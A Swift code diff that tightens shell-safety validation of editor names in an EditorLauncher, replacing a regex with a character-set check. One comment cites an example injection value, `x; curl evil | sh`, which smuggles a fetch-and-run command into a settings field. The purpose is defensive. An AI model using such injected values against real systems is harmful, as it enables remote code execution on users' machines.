@@ -27,13 +27,15 @@ enum EditorLauncher {
     private static var pathCache: [String: String] = [:]
 
     /// Editor names we'll pass through `zsh -ilc 'command -v <name>'` must be
-    /// shell-safe. Reject anything outside this character class so a
+    /// shell-safe. Reject anything outside `[A-Za-z0-9._+-]` so a
     /// `defaults write … editor "x; curl evil | sh"` self-pwn isn't possible.
-    private static let safeNamePattern = try! NSRegularExpression(pattern: "^[A-Za-z0-9._+-]+$")
+    private static let safeNameChars: Set<Character> = Set(
+        "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789._+-"
+    )
 
     static func isSafeEditorName(_ name: String) -> Bool {
-        let range = NSRange(name.startIndex..., in: name)
-        return safeNamePattern.firstMatch(in: name, range: range) != nil
+        guard !name.isEmpty else { return false }
+        return name.allSatisfy { safeNameChars.contains($0) }
     }
 
     /// Build the argv (excluding the binary) for opening `file` at `line` (0-indexed).
